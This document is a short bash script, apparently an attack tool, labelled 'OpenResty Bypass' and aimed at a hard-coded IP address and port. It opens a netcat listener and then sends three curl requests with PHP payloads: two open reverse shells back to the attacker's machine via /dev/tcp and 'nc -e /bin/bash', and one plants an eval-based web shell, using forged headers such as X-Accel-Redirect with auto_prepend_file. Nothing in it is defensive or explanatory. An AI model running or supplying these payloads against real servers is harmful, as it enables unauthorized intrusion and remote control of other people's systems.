#!/bin/bash
TARGET="14.225.209.143:443"
IP=$(curl -s ifconfig.me)
PORT=4444

echo "[+] OpenResty Bypass → ${IP}:${PORT}"
nc -lvnp $PORT &

# 🔥 BYPASS 1: Lua vars + php://input
curl -k -s -X POST \
-H "X-Lua-Path: php://input" \
-H "Content-Length: 60" \
--data-binary "<?php system('bash -i >& /dev/tcp/$IP/$PORT 0>&1'); ?>" \
"https://${TARGET}/"

# 🔥 BYPASS 2: Location header injection
curl -k -s \
-H "Location: php://input?-dallow_url_include=1" \
--data "<?php system('nc -e /bin/bash $IP $PORT'); ?>" \
"https://${TARGET}/"

# 🔥 BYPASS 3: OpenResty specific (content_by_lua)
curl -k -s \
-H "X-Accel-Redirect: /?-d+auto_prepend_file=php://input" \
--data-binary "<?php eval(\$_POST[0]); ?>" \
-d "0=system('bash -i >& /dev/tcp/$IP/$PORT 0>&1');" \
"https://${TARGET}/"
